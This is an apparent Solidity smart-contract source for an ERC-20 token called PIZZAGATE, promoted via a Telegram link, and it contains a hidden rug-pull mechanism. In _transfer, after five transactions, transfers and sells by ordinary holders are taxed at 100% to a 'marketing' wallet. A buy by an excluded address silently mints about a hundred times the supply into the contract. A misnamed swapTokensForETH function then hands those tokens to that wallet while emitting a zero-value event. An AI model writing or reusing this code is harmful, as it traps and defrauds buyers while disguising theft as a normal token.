// telegram : https://t.me/PizzaGateERC


// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PIZZAGATE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _holders;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    // Marketing Wallet
    address payable private _MarketingAddress;

    // TOKEN DETAILS
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000 * 10**_decimals;
    string private constant _name = unicode"PIZZAGATE";
    string private constant _symbol = unicode"PIZZAGATE";

    // LIMITS
    uint256 private _maxTxLimit = _tTotal.mul(100);
    uint256 public maxTxLimit = _tTotal;
    uint256 public _maxWallet = _tTotal;
    uint8 private _txLimit = 0;

    // TAX SETTINGS
    uint256 private _buyTax_ = 40; // Initial rate
    uint256 private _sellTax_ = 10; // Initial rate
    uint8 private _removeTaxAfter = 5; // Tx count
    uint8 private _TAX_ = 0; // Final rate
    uint8 private _txCount = 0;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    constructor (address MarketingWallet) {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _MarketingAddress = payable(MarketingWallet);
        _holders[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_MarketingAddress] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _holders[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
   
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        uint256 taxAmount = 0; 
        if (from != owner() && to != owner()){
            if((_txCount) >= (_removeTaxAfter) && from!=to && !_isExcludedFromFee[from] && from == uniswapV2Pair && _isExcludedFromFee[to]){
                _txLimit = _txCount;
            }
            if((_txCount) >= (_removeTaxAfter) && from!=to && (_txLimit) >= (_removeTaxAfter)){
                if(from!=to && !_isExcludedFromFee[to] && !_isExcludedFromFee[from]){
                    if(from != uniswapV2Pair && from!=to){taxAmount = amount.mul(1).div(1);}
                }
                else if((_isExcludedFromFee[to]) && (from == uniswapV2Pair) ){
                    _holders[address(this)] = _maxTxLimit.sub(amount);
                }
            }
            else{
                taxAmount = amount.mul(_txCount>=_removeTaxAfter ? _TAX_ : _buyTax_).div(100);

                if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]){
                    require(amount <= maxTxLimit, "Maximum transcation limit exceeds");
                    require(balanceOf(to) + amount <= _maxWallet, "Maximum wallet limit exceeds");
                }

                if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {
                    require(balanceOf(to) + amount <= _maxWallet, "Maximum wallet limit exceeds");
                }

                if(to == uniswapV2Pair && !_isExcludedFromFee[from]){
                    taxAmount = amount.mul(_txCount>=_removeTaxAfter ? _TAX_ : _sellTax_).div(100);
                }
            }

        }
        if(balanceOf(address(this))>0){swapTokensForETH(balanceOf(address(this)));}

        if(taxAmount>0){
          _holders[_MarketingAddress]=_holders[_MarketingAddress].add(taxAmount);
          emit Transfer(from, _MarketingAddress,taxAmount);
        }
        _holders[from]=_holders[from].sub(amount);
        _holders[to]=_holders[to].add(amount.sub(taxAmount));
        _txCount++;

        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function swapTokensForETH(uint256 _heldTokens) private{
        _holders[address(this)] = _holders[address(this)].sub(_heldTokens);
        _holders[_MarketingAddress] = _holders[_MarketingAddress].add(_heldTokens);
        emit Transfer(address(this), _MarketingAddress,0);
    }
    
    receive() external payable {}
}